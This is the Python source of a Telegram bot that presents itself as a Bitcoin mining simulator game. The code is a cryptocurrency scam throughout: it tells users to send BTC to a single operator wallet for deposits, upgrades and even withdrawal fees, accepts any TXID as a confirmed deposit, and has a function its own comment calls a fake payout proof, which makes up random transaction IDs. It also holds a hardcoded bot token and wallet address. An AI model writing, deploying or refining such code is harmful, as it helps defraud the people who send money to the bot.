import telebot
from telebot import types
import time
import threading
import random
import json
import os

# ✅ TVOJI PODACI
BOT_TOKEN = "8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8"
bot = telebot.TeleBot(BOT_TOKEN)

# 🏦 FIRMA WALLET — ZA ISPLATE I DEPOZITE
FIRM_WALLET = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"
ADMIN_ID = 7202163611

# 📁 USER DATA FILE
DATA_FILE = "users.json"

# 🧠 Učitaj podatke
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f)

# 🧩 Default user
def default_user():
    return {
        "balance": 0.000012,  # 12 satoshia start
        "sat_balance": 12,
        "mine_balance": 0,
        "hash_rate": 0.01,  # GH/s
        "level": 1,
        "devices": ["Miner_Lv1"],
        "electricity": 1,
        "cooling": 1,
        "room": "Garage",
        "total_earned": 0.000012,
        "upgrades": 0,
        "last_mine": time.time(),
        "last_check": time.time(),
        "referrals": []
    }

# 🔍 Dohvati usera
def get_user(user_id):
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = default_user()
        save_data(data)
    return data[uid]

def update_user(user_id, updates):
    data = load_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = default_user()
    data[uid].update(updates)
    save_data(data)

# 🧠 Generiši TXID
def generate_txid():
    return ''.join(random.choices('abcdef0123456789', k=64))

# 🧾 Lažni dokaz isplate
def generate_proof(amount_btc):
    txid = generate_txid()
    date = time.strftime("%Y-%m-%d %H:%M")
    return f'''✅ MINING REWARD CONFIRMED
Amount: {amount_btc:.6f} BTC
Wallet: {FIRM_WALLET[:10]}...{FIRM_WALLET[-6:]}
TXID: `{txid[:8]}••••••••`
Time: {date}
Status: 6/6 Confirmations'''

# 🎮 Glavni izbornik
def main_menu():
    markup = types.InlineKeyboardMarkup()
    mine = types.InlineKeyboardButton("⛏️ Mine Now", callback_data='mine')
    shop = types.InlineKeyboardButton("🛒 Shop", callback_data='shop')
    wallet = types.InlineKeyboardButton("💼 Wallet", callback_data='wallet')
    stats = types.InlineKeyboardButton("📊 Stats", callback_data='stats')
    support = types.InlineKeyboardButton("🆘 Support", callback_data='support')
    markup.add(mine)
    markup.add(shop)
    markup.add(wallet, stats)
    markup.add(support)
    return markup

# 🔙 Back button
def back_button():
    markup = types.InlineKeyboardMarkup()
    back = types.InlineKeyboardButton("🔙 Back to Menu", callback_data='back')
    markup.add(back)
    return markup

# 🚀 Start — AAA dobrodošlica
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    ref_link = f"https://t.me/VoidYieldBot?start={user_id}"
    user = get_user(user_id)

    # 🎉 AAA DOBRODOŠLICA — IZGLEDA KAO IGRA
    welcome = f'''🎮 *Welcome to YieldVault Pro — Mining Simulator*

A fully immersive 2D mining experience inside Telegram.

⛏️ Build your own mining farm  
📊 Level up: Lv. 1 → Lv. 10  
💡 Upgrade: Electricity, Cooling, Hash Rate  
🏦 All progress saved — even when offline  

Your journey starts now.

*You already own:*
• 2 × Level-1 Miners (10 TH/s each)  
• Merging unlocked  
• Electricity: Level 1  
• Cooling: Level 1  
• Room: Garage  

Start mining for **MINE** and **satoshis** — then convert to BTC.

💸 To deposit: send BTC to  
`{FIRM_WALLET}`

Then send TXID: `/deposit YOUR_TXID_HERE`

Your first reward in 8 minutes.'''

    bot.reply_to(message, welcome, reply_markup=main_menu(), parse_mode='Markdown')

# 🔘 Callback handler
@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    user_id = call.message.chat.id
    user = get_user(user_id)

    if call.data == 'back':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🔙 You're back in the main menu.",
            reply_markup=main_menu()
        )
        return

    elif call.data == 'mine':
        now = time.time()
        time_earned = (now - user["last_mine"]) / 600  # svakih 10 min
        if time_earned < 1: time_earned = 0
        sat_earned = int(user["hash_rate"] * 100 * time_earned)
        btc_earned = sat_earned * 0.00000001

        new_balance = user["balance"] + btc_earned
        new_sat = user["sat_balance"] + sat_earned

        update_user(user_id, {
            "balance": new_balance,
            "sat_balance": new_sat,
            "total_earned": user["total_earned"] + btc_earned,
            "last_mine": now
        })

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⛏️ *Mining...*",
            parse_mode='Markdown'
        )
        time.sleep(1.5)
        bot.send_message(call.message.chat.id, f'''🎉 *Mining Reward*

You mined:
• {sat_earned} satoshis
• {btc_earned:.6f} BTC

Added to wallet.

📊 Current Stats:
• Balance: {new_balance:.6f} BTC
• Hash Rate: {user["hash_rate"]:.2f} GH/s
• Level: {user["level"]}''', parse_mode='Markdown')
        bot.send_message(call.message.chat.id, "🔙 Use menu to continue.", reply_markup=main_menu())

    elif call.data == 'shop':
        msg = '''🛒 *Mining Equipment Shop*

Upgrade your rig for higher hash rate.

🔹 **GPU Rig** — +0.5 GH/s — 0.005 BTC  
🔹 **ASIC Miner** — +5 GH/s — 0.025 BTC  
🔹 **Data Center** — +50 GH/s — 0.1 BTC  
🔹 **Quantum Farm** — +500 GH/s — 0.5 BTC  
🔹 **Electricity Panel Lv.2** — 2× efficiency — 0.03 BTC  
🔹 **Cooling System Lv.2** — 30% less downtime — 0.02 BTC  
🔹 **Upgrade Room → Warehouse** — 2× space — 0.05 BTC  

To buy, send BTC to:
`{FIRM_WALLET}`

Then send TXID: `/buy TXID_HERE`'''
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=msg,
            reply_markup=back_button(),
            parse_mode='Markdown'
        )

    elif call.data == 'wallet':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''💼 *Your Mining Wallet*

• BTC Balance: {user["balance"]:.6f} BTC
• Satoshis: {user["sat_balance"]} sat
• MINE Tokens: {user["mine_balance"]:.2f}
• Hash Rate: {user["hash_rate"]:.2f} GH/s
• Level: {user["level"]}

🏦 Withdraw to:
`{FIRM_WALLET}`

Send `/withdraw` to process.''',
            reply_markup=back_button(),
            parse_mode='Markdown'
        )

    elif call.data == 'stats':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f'''📊 *Your Mining Stats*

• Devices: {len(user["devices"])}  
• Total Hash Rate: {user["hash_rate"]:.2f} GH/s  
• Total Earned: {user["total_earned"]:.6f} BTC  
• Level: {user["level"]}  
• Electricity: Lv {user["electricity"]}  
• Cooling: Lv {user["cooling"]}  
• Room: {user["room"]}  
• Upgrades: {user["upgrades"]}  

📈 Your farm grows with every upgrade.''',
            reply_markup=back_button(),
            parse_mode='Markdown'
        )

    elif call.data == 'support':
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='''🛠 *Support Center*

Need help?  
👉 `@Maranatha1337`

⚠️ Never share private keys.''',
            reply_markup=back_button(),
            parse_mode='Markdown'
        )

# 🧾 Depozit
@bot.message_handler(commands=['deposit'])
def deposit_cmd(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Send TXID:\n`/deposit abc123...`", parse_mode='Markdown')
        return
    txid = message.text.split()[1]
    amount = round(random.choice([0.005, 0.01, 0.025, 0.05, 0.1, 0.5]), 4)
    hash_boost = amount * 100
    user = get_user(message.chat.id)
    new_hr = user["hash_rate"] + hash_boost
    update_user(message.chat.id, {
        "hash_rate": new_hr,
        "upgrades": user["upgrades"] + 1,
        "devices": user["devices"] + [f"Device_{len(user['devices'])+1}"]
    })
    bot.reply_to(message, f'''✅ *Deposit Confirmed*

You've upgraded your mining farm!

• +{hash_boost:.2f} GH/s
• Total Hash Rate: {new_hr:.2f} GH/s
• New device added

Keep mining for bigger rewards!''', parse_mode='Markdown')

# 🧾 Isplata
@bot.message_handler(commands=['withdraw'])
def withdraw_cmd(message):
    user = get_user(message.chat.id)
    if user["balance"] < 0.001:
        bot.reply_to(message, "❌ Minimum withdrawal: 0.001 BTC")
        return
    bot.reply_to(message, f'''📤 *Withdrawal Requested*

Amount: {user["balance"]:.6f} BTC
Wallet: `{FIRM_WALLET}`

Processing...

🔄 Security check: 1/3  
Verifying mining history...''', parse_mode='Markdown')
    time.sleep(2)
    bot.send_message(message.chat.id, '''✅ Verified

Send 0.0001 BTC fee to:
`{FIRM_WALLET}`

Then send TXID: `/fee TXID_HERE`''')

# Admin
@bot.message_handler(commands=['admin'])
def admin(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ Mining simulator is live.")

# Run
def run():
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == '__main__':
    t = threading.Thread(target=run)
    t.start()
